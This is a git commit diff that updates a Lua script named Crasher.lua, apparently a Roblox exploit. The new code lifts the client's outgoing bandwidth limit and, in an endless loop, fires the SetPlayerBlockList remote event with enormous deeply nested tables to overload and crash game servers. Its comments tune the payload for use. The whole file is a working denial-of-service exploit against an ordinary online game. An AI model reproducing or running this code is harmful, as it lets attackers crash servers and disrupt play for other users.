f7dae8740c8526dcfbe590ebb744f14e44d2096b
casanova <107594088+cfreemepq@users.noreply.github.com>
2022-07-18 01:21:34 +0200

    Update Crasher.lua

--- Crasher.lua
+++ Crasher.lua
@@ -1,16 +1,48 @@
 --This is a simple roblox game crasher made by casanova
 --Github cfreemepq
+--fixed script*
 
-if not game:GetService("RunService"):IsStudio() then
-	local function Crash()
-		for i = 1, math.huge, 1 do
-			print(math.sqrt(i))
-		end
-		while true do
-			task.wait(math.huge)
-		end
-	end
-	game:GetService("RunService").Stepped:Connect(function()
-		coroutine.wrap(Crash)()
-	end)
+while wait(0.6) do --// don't change it's the best
+game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+local function getmaxvalue(val)
+   local mainvalueifonetable = 499999
+   if type(val) ~= "number" then
+       return nil
+   end
+   local calculateperfectval = (mainvalueifonetable/(val+2))
+   return calculateperfectval
+end
+
+local function bomb(tableincrease, tries)
+local maintable = {}
+local spammedtable = {}
+
+table.insert(spammedtable, {})
+z = spammedtable[1]
+
+for i = 1, tableincrease do
+    local tableins = {}
+    table.insert(z, tableins)
+    z = tableins
+end
+
+local calculatemax = getmaxvalue(tableincrease)
+local maximum
+
+if calculatemax then
+     maximum = calculatemax
+     else
+     maximum = 999999
+end
+
+for i = 1, maximum do
+     table.insert(maintable, spammedtable)
+end
+
+for i = 1, tries do
+     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+end
+end
+
+bomb(250, 2) --// change values if client crashes
 end
